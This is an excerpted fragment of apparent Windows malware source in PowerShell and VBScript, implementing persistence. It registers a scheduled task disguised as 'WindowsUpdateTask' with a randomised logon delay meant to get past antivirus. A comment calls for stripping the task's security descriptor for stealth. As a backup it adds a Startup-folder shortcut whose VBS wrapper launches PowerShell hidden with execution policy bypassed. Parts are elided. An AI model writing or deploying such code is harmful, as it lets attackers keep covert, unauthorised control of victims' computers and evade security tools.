...
# === PERSISTENCE: Scheduled Task (primary - smarter reboot delay) ===
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    # Trigger: At logon BUT with a random 45-120 second delay so AV/network is fully up
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $trigger.Delay = (New-TimeSpan -Seconds (Get-Random -Minimum 45 -Maximum 120))
    ...
    # Extra stealth: nuke the security descriptor again
    try {
...
# === PERSISTENCE: Startup Folder LNK (backup - delayed via VBS wrapper) ===
...
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$localPath$""", 0, False
Function GetRandomDelay()
    Randomize
    GetRandomDelay = Int((120000 - 45000 + 1) * Rnd + 45000)
End Function
'@
    $vbsContent = $vbsContent.Replace('$localPath$', $scriptPath)
